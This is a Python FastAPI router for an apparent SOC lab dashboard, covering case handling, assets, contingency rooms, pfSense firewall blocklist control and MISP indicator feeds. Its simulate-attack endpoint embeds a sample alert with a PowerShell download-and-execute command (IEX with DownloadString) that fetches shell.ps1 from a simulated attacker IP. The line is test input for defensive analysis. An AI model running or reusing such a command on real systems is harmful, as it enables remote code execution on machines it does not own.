import os
import json
import threading
from datetime import datetime
from fastapi import APIRouter, Body
from fastapi.responses import HTMLResponse
from web.state import STATE, save_persistent_state
from tools.firewall_tools import clear_all_pfsense_blocks, tool_unblock_firewall_ip, sync_pfsense_blocklist
from core.misp_vault import get_ioc_records, add_ioc_record, fetch_open_misp_feeds
from core.case_manager import (
    close_expired_cases,
    get_case_by_id,
    update_case_status,
    build_and_save_case_graph,
)
from core.asset_manager import (
    get_assets_with_case_counts,
    upsert_asset,
    delete_asset,
)
from core.contingency_room import (
    get_contingency_rooms_overview,
    create_contingency_room,
    update_contingency_room,
    delete_contingency_room,
    attach_case_to_room,
    detach_case_from_room,
    post_room_message,
    create_and_execute_decision,
    revert_tactical_decision,
    reapply_tactical_decision,
)

router = APIRouter()

@router.get("/api/state")
def get_state():
    close_expired_cases()
    rooms_overview = get_contingency_rooms_overview()
    return {
        "stats": STATE["stats"],
        "endpoint_containment": STATE.get("endpoint_containment", {}),
        "agent_ip_registry": STATE.get("agent_ip_registry", {}),
        "cases": STATE.get("cases", []),
        "parent_incidents": STATE.get("parent_incidents", []),
        "assets": get_assets_with_case_counts(),
        "contingency_rooms": rooms_overview["rooms"],
        "tactical_decisions": rooms_overview["decisions"],
        "reasoning_stream": list(STATE["reasoning_stream"]),
        "decisions": list(STATE["decisions"])
    }

@router.get("/api/cases")
def get_cases(domain: str = "", status: str = ""):
    close_expired_cases()
    cases = list(STATE.get("cases", []))
    if domain:
        d_up = domain.strip().upper()
        cases = [c for c in cases if c.get("domain") == d_up]
    if status:
        s_up = status.strip().upper()
        cases = [c for c in cases if c.get("status") == s_up]
    return {
        "cases": cases,
        "parent_incidents": STATE.get("parent_incidents", []),
        "agent_ip_registry": STATE.get("agent_ip_registry", {}),
    }

@router.post("/api/cases/{case_id}/status")
def set_case_status(case_id: str, payload: dict):
    new_status = payload.get("status", "")
    reason = payload.get("reason", "")
    ok, updated_case, msg = update_case_status(case_id, new_status, reason)
    return {"success": ok, "case": updated_case, "message": msg}

@router.post("/api/cases/{case_id}/replay")
def replay_case(case_id: str):
    from core.controller import replay_case_alerts
    case_obj = get_case_by_id(case_id)
    if not case_obj:
        return {"success": False, "message": f"Không tìm thấy Case {case_id}."}
    if not case_obj.get("incident_alerts"):
        return {"success": False, "message": f"Case {case_id} chưa có alert gốc để replay."}
    threading.Thread(target=replay_case_alerts, args=(case_id,), daemon=True).start()
    return {"success": True, "message": f"Đã kích hoạt Replay phân tích lại {case_id} từ {len(case_obj['incident_alerts'])} alerts gốc."}

@router.get("/api/cases/{case_id}/graph")
def get_case_graph(case_id: str):
    case_obj = get_case_by_id(case_id)
    if not case_obj:
        return {"success": False, "graph": None, "message": f"Không tìm thấy Case {case_id}."}
    graph = case_obj.get("attack_graph")
    if not graph:
        return {"success": True, "graph": None, "message": "Case chưa có sơ đồ được vẽ."}
    return {"success": True, "graph": graph, "message": "Đã tải sơ đồ đã lưu."}

@router.post("/api/cases/{case_id}/graph")
def generate_case_graph(case_id: str):
    ok, graph_data, msg = build_and_save_case_graph(case_id)
    return {"success": ok, "graph": graph_data, "message": msg}

@router.get("/api/assets")
def list_assets():
    close_expired_cases()
    return {"assets": get_assets_with_case_counts()}

@router.post("/api/assets")
def save_asset(payload: dict):
    ok, asset, msg = upsert_asset(payload)
    return {
        "success": ok,
        "asset": asset,
        "message": msg,
        "assets": get_assets_with_case_counts(),
    }

@router.delete("/api/assets/{asset_id}")
def remove_asset(asset_id: str):
    ok, msg = delete_asset(asset_id)
    return {
        "success": ok,
        "message": msg,
        "assets": get_assets_with_case_counts(),
    }


@router.get("/api/rooms")
def list_contingency_rooms():
    close_expired_cases()
    return get_contingency_rooms_overview()


@router.post("/api/rooms")
def add_contingency_room(payload: dict):
    ok, room, msg = create_contingency_room(payload)
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "room": room,
        "message": msg,
        "rooms": overview["rooms"],
        "decisions": overview["decisions"],
    }


@router.patch("/api/rooms/{room_id}")
@router.post("/api/rooms/{room_id}/update")
def edit_contingency_room(room_id: str, payload: dict):
    ok, room, msg = update_contingency_room(room_id, payload)
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "room": room,
        "message": msg,
        "rooms": overview["rooms"],
    }


@router.delete("/api/rooms/{room_id}")
def remove_contingency_room(room_id: str):
    ok, msg = delete_contingency_room(room_id)
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "message": msg,
        "rooms": overview["rooms"],
    }


@router.post("/api/rooms/{room_id}/cases")
def add_case_to_room(room_id: str, payload: dict):
    ok, room, msg = attach_case_to_room(room_id, payload.get("case_id", ""))
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "room": room,
        "message": msg,
        "rooms": overview["rooms"],
        "decisions": overview["decisions"],
    }


@router.delete("/api/rooms/{room_id}/cases/{case_id}")
def remove_case_from_room(room_id: str, case_id: str):
    ok, room, msg = detach_case_from_room(room_id, case_id)
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "room": room,
        "message": msg,
        "rooms": overview["rooms"],
        "decisions": overview["decisions"],
    }


@router.post("/api/rooms/{room_id}/messages")
def send_room_message(room_id: str, payload: dict):
    ok, room, msg = post_room_message(room_id, payload)
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "room": room,
        "message": msg,
        "rooms": overview["rooms"],
    }


@router.post("/api/rooms/{room_id}/decisions")
def execute_room_decision(room_id: str, payload: dict):
    ok, res_obj, msg = create_and_execute_decision(room_id, payload)
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "decision": res_obj.get("decision") if isinstance(res_obj, dict) else None,
        "room": res_obj.get("room") if isinstance(res_obj, dict) else None,
        "message": msg,
        "rooms": overview["rooms"],
        "decisions": overview["decisions"],
    }


@router.post("/api/decisions/{decision_id}/revert")
def revert_decision(decision_id: str, payload: dict = Body(default={})):
    reason = payload.get("reason", "") if isinstance(payload, dict) else ""
    ok, res_obj, msg = revert_tactical_decision(decision_id, reason=reason)
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "decision": res_obj.get("decision") if isinstance(res_obj, dict) else None,
        "room": res_obj.get("room") if isinstance(res_obj, dict) else None,
        "message": msg,
        "rooms": overview["rooms"],
        "decisions": overview["decisions"],
    }


@router.post("/api/decisions/{decision_id}/reapply")
def reapply_decision(decision_id: str, payload: dict = Body(default={})):
    reason = payload.get("reason", "") if isinstance(payload, dict) else ""
    ok, res_obj, msg = reapply_tactical_decision(decision_id, reason=reason)
    overview = get_contingency_rooms_overview()
    return {
        "success": ok,
        "decision": res_obj.get("decision") if isinstance(res_obj, dict) else None,
        "room": res_obj.get("room") if isinstance(res_obj, dict) else None,
        "message": msg,
        "rooms": overview["rooms"],
        "decisions": overview["decisions"],
    }

@router.post("/api/simulate")
def simulate_attack():
    from core.controller import run_agent_loop
    sample = {
        "source": "pfSense Suricata NIDS",
        "level": 10,
        "title": "ET SCAN Nmap Scripting Engine & Remote Code Execution Attempt",
        "src_ip": "192.168.63.250",
        "dest_ip": "192.168.214.10",
        "agent_ip": "192.168.214.10",
        "victim_ip": "192.168.214.10",
        "primary_hash": "44d88612fea8a8f36de82e1278abb02f",
        "mitre": ["T1046 - Network Service Discovery", "T1059.001 - PowerShell"],
        "file_hashes": ["44d88612fea8a8f36de82e1278abb02f"],
        "encoded_payload": "cG93ZXJzaGVsbCAtZW5jIElFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnhttp://192.168.63.250/shell.ps1')"
    }
    threading.Thread(target=run_agent_loop, args=(sample,), daemon=True).start()
    return {"status": "triggered"}

@router.post("/api/clear-blocklist")
def clear_blocklist():
    success, msg = clear_all_pfsense_blocks()
    STATE["stats"]["endpoint_actions"] = []
    STATE["endpoint_containment"] = {}
    save_persistent_state()
    return {"success": success, "message": msg}

@router.post("/api/pfsense/sync")
def sync_pfsense():
    success, blocked_ips = sync_pfsense_blocklist(quiet=False)
    return {
        "success": success,
        "blocked_ips": blocked_ips,
        "message": f"Đã đồng bộ {len(blocked_ips)} IP từ pfSense SOC_BLOCKLIST." if success else "Không thể kết nối tới pfSense API."
    }

@router.post("/api/unblock")
def unblock_ip(payload: dict):
    ip = payload.get("ip")
    if not ip:
        return {"success": False, "message": "Thieu IP"}
    msg = tool_unblock_firewall_ip(ip)
    return {"success": True, "message": msg}

@router.get("/api/misp")
def get_misp_iocs(limit: int = 100, offset: int = 0, search: str = ""):
    records, total = get_ioc_records(limit=limit, offset=offset, search=search)
    return {
        "total": total,
        "limit": limit,
        "offset": offset,
        "iocs": records
    }

@router.post("/api/misp")
def add_misp_ioc(payload: dict):
    val = payload.get("value")
    if not val:
        return {"success": False, "message": "Thiếu giá trị indicator (value)"}
    try:
        entry = add_ioc_record(
            indicator=str(val).strip(),
            ioc_type=payload.get("type", "ip"),
            threat_name=payload.get("comment", "Lab Custom IOC"),
            source="Lab Custom",
            confidence=payload.get("threat_level", "High")
        )
        return {"success": True, "message": f"Đã thêm IOC {entry['id']}", "entry": entry}
    except Exception as e:
        return {"success": False, "message": str(e)}

@router.post("/api/misp/sync")
def sync_misp_feeds():
    """Kích hoạt tải và đồng bộ các Threat Feed công khai miễn phí chuẩn MISP/OSINT"""
    try:
        stats = fetch_open_misp_feeds()
        return {
            "success": True,
            "message": f"Đã đồng bộ thành công! Hiện có {stats['total_in_db']} IOCs trong SQLite Vault.",
            "stats": stats
        }
    except Exception as e:
        return {"success": False, "message": f"Lỗi đồng bộ feed: {str(e)}"}

@router.get("/", response_class=HTMLResponse)
def get_ui():
    html_path = os.path.join(os.path.dirname(__file__), "templates", "index.html")
    with open(html_path, "r", encoding="utf-8") as f:
        return f.read()
